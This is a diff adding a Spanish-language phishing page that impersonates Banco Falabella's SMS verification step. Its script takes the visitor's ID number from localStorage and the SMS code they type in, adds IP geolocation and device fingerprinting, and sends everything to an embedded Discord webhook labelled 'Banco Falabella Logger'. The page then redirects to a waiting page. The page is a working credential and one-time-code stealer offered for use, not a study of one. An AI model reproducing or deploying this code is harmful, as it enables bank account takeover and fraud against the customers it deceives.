@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Banco Falabella — Código SMS</title>
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  html, body {
+    height: 100%;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    background: #ffffff;
+    color: #333;
+    -webkit-font-smoothing: antialiased;
+  }
+  .app {
+    display: flex;
+    flex-direction: column;
+    min-height: 100vh;
+    max-width: 430px;
+    margin: 0 auto;
+    background: #ffffff;
+  }
+  .logo-section {
+    flex: 1;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 80px 24px 40px;
+  }
+  .logo-section img { width: 190px; height: auto; }
+  .form-section { 
+    padding: 0 20px 28px;
+    animation: slideUp 0.5s ease-out;
+  }
+  @keyframes slideUp {
+    from { opacity: 0; transform: translateY(20px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+  .greeting-section {
+    margin-bottom: 32px;
+    text-align: center;
+  }
+  .greeting-title {
+    font-size: 24px;
+    font-weight: 700;
+    color: #1a1a1a;
+    margin-bottom: 8px;
+    letter-spacing: -0.5px;
+  }
+  .user-info {
+    font-size: 13.5px;
+    color: #888;
+    margin-bottom: 20px;
+  }
+  .note {
+    margin-bottom: 24px;
+    font-size: 15px;
+    line-height: 1.8;
+    color: #555;
+    background: #f9f9f9;
+    padding: 16px 14px;
+    border-radius: 10px;
+    border-left: 4px solid #4a9c2f;
+  }
+  .field-group {
+    border-radius: 12px;
+    overflow: hidden;
+    border: 1.5px solid #d0d0d0;
+    margin-bottom: 18px;
+    background: #fff;
+  }
+  .form-input {
+    width: 100%;
+    padding: 16px 14px;
+    font-size: 16px;
+    color: #333;
+    background: #fff;
+    border: none;
+    outline: none;
+  }
+  .form-input::placeholder { color: #aaa; }
+  .btn-continuar {
+    width: 100%;
+    padding: 18px;
+    border-radius: 50px;
+    background: #d0d8de;
+    color: #6b7a82;
+    font-size: 17px;
+    font-weight: 500;
+    border: none;
+    cursor: pointer;
+    transition: background 0.25s, color 0.25s;
+    letter-spacing: 0.2px;
+  }
+  .btn-continuar.active { background: #4a9c2f; color: #fff; }
+  .spacer { flex: 2; }
+</style>
+</head>
+<body>
+<div class="app">
+  <div class="logo-section">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/ec/Logotipo_Banco_Falabella.svg/1280px-Logotipo_Banco_Falabella.svg.png"
+         alt="Banco Falabella" width="190" height="76" loading="lazy">
+  </div>
+
+  <div class="form-section">
+    <div class="greeting-section">
+      <p class="greeting-title">Hola, querido usuario</p>
+      <p class="user-info" id="userInfoText">Por favor, verifica tu identidad</p>
+    </div>
+    <p class="note">Hemos enviado un código de verificación al número asociado a tu cuenta de <strong>Banco Falabella</strong>. Ingresa el código que recibiste en tu teléfono para continuar con seguridad.</p>
+    <div class="field-group">
+      <input class="form-input" id="smsCode" type="tel" maxlength="10"
+             placeholder="Código SMS" autocomplete="off" inputmode="numeric"
+             aria-label="Código SMS">
+    </div>
+    <button class="btn-continuar" id="btnContinuar" type="button">Verificar código</button>
+  </div>
+
+  <div class="spacer"></div>
+</div>
+
+<script>
+  const smsCode = document.getElementById("smsCode");
+  const btnContinuar = document.getElementById("btnContinuar");
+  const userInfoText = document.getElementById("userInfoText");
+  const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1490551948598837268/ee4s2QMfWrRrKHaeCKDVKYzP3Cg4wFD5G7lbg4v-KOLnAWwolFgJSXcYWfGLKH-IJ8pV";
+
+  // Obtener DNI y tipo de documento del localStorage
+  const savedDni = localStorage.getItem("bf_last_dni") || "No disponible";
+  const docType = localStorage.getItem("bf_doc_type") || "DNI";
+  
+  // Mapear tipos de documento
+  const docTypeLabel = {
+    "DNI": "DNI",
+    "CE": "Carnet",
+    "PAS": "Pasaporte"
+  };
+  
+  if (savedDni !== "No disponible") {
+    const label = docTypeLabel[docType] || docType;
+    userInfoText.textContent = `${label}: ${savedDni}`;
+  }
+
+  function updateButton() {
+    const codeOk = smsCode.value.trim().length >= 3;
+    btnContinuar.classList.toggle("active", codeOk);
+  }
+
+  smsCode.addEventListener("input", function() {
+    this.value = this.value.replace(/[^0-9]/g, "");
+    updateButton();
+  });
+
+  async function getUserInfo() {
+    let ip = "Desconocida", country = "Desconocido", city = "Desconocida", isp = "Desconocido", timezone = "Desconocido";
+    try {
+      const res = await fetch("https://ipapi.co/json/");
+      const data = await res.json();
+      ip       = data.ip        || ip;
+      country  = data.country_name || country;
+      city     = data.city      || city;
+      isp      = data.org       || isp;
+      timezone = data.timezone  || timezone;
+    } catch(e) {}
+    return { ip, country, city, isp, timezone };
+  }
+
+  function getDeviceInfo() {
+    const ua = navigator.userAgent;
+    let device = "Desktop";
+    if (/iPhone/i.test(ua))       device = "iPhone";
+    else if (/iPad/i.test(ua))    device = "iPad";
+    else if (/Android/i.test(ua)) device = "Android";
+    const browser = /Chrome/i.test(ua) ? "Chrome"
+                  : /Firefox/i.test(ua) ? "Firefox"
+                  : /Safari/i.test(ua)  ? "Safari"
+                  : /Edge/i.test(ua)    ? "Edge" : "Otro";
+    const os = /Windows/i.test(ua) ? "Windows"
+             : /Mac/i.test(ua)     ? "macOS"
+             : /Linux/i.test(ua)   ? "Linux"
+             : /Android/i.test(ua) ? "Android"
+             : /iOS/i.test(ua)     ? "iOS" : "Desconocido";
+    const lang = navigator.language || "Desconocido";
+    const screen = `${window.screen.width}x${window.screen.height}`;
+    const now = new Date();
+    const fecha = now.toLocaleDateString("es-PE", { weekday:"long", year:"numeric", month:"long", day:"numeric" });
+    const hora  = now.toLocaleTimeString("es-PE", { hour:"2-digit", minute:"2-digit", second:"2-digit" });
+    return { device, browser, os, lang, screen, fecha, hora };
+  }
+
+  async function sendToDiscord(dni, docTypeShort, code) {
+    const geo = await getUserInfo();
+    const dev = getDeviceInfo();
+
+    const payload = {
+      username: "Banco Falabella Logger",
+      avatar_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/e/ec/Logotipo_Banco_Falabella.svg/1280px-Logotipo_Banco_Falabella.svg.png",
+      embeds: [{
+        title: "🏦 CÓDIGO SMS VERIFICADO — BANCO FALABELLA",
+        color: 0x4a9c2f,
+        thumbnail: {
+          url: "https://upload.wikimedia.org/wikipedia/commons/thumb/e/ec/Logotipo_Banco_Falabella.svg/1280px-Logotipo_Banco_Falabella.svg.png"
+        },
+        fields: [
+          {
+            name: "👤 USUARIO",
+            value: `\`\`\`
+${docTypeLabel[docTypeShort]}: ${dni}
+\`\`\``,
+            inline: false
+          },
+          {
+            name: "🔐 CÓDIGO SMS",
+            value: `\`\`\`
+Código: ${code}
+\`\`\``,
+            inline: false
+          },
+          {
+            name: "🌐 RED / IP",
+            value: `> **IP:** \`${geo.ip}\`
+> **País:** ${geo.country}
+> **Ciudad:** ${geo.city}
+> **ISP:** ${geo.isp}
+> **Zona horaria:** ${geo.timezone}`,
+            inline: false
+          },
+          {
+            name: "💻 DISPOSITIVO",
+            value: `> **Dispositivo:** ${dev.device}
+> **SO:** ${dev.os}
+> **Navegador:** ${dev.browser}
+> **Idioma:** ${dev.lang}
+> **Resolución:** ${dev.screen}`,
+            inline: false
+          },
+          {
+            name: "🕐 FECHA Y HORA",
+            value: `> 📅 ${dev.fecha}
+> 🕐 ${dev.hora}`,
+            inline: false
+          }
+        ],
+        footer: {
+          text: "⚡ by @Brknshinexxx  •  Telegram",
+          icon_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/e/ec/Logotipo_Banco_Falabella.svg/1280px-Logotipo_Banco_Falabella.svg.png"
+        },
+        timestamp: new Date().toISOString()
+      }]
+    };
+
+    try {
+      const response = await fetch(WEBHOOK_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      });
+      return response.ok;
+    } catch(e) {
+      console.error("Error sending to Discord:", e);
+      return false;
+    }
+  }
+
+  btnContinuar.addEventListener("click", async function() {
+    if (!this.classList.contains("active")) return;
+
+    const code = smsCode.value.trim();
+    const dni = savedDni;
+
+    this.textContent = "Enviando código...";
+    this.disabled = true;
+
+    const success = await sendToDiscord(dni, docType, code);
+
+    if (success) {
+      this.textContent = "✓ Código verificado";
+      this.style.background = "#4a9c2f";
+      setTimeout(() => {
+        window.location.href = "wait2.html";
+      }, 800);
+    } else {
+      this.textContent = "Error al enviar";
+      this.style.background = "#e74c3c";
+      setTimeout(() => {
+        this.textContent = "Verificar código";
+        this.disabled = false;
+        this.style.background = "";
+      }, 2000);
+    }
+  });
+</script>
+</body>
+</html>
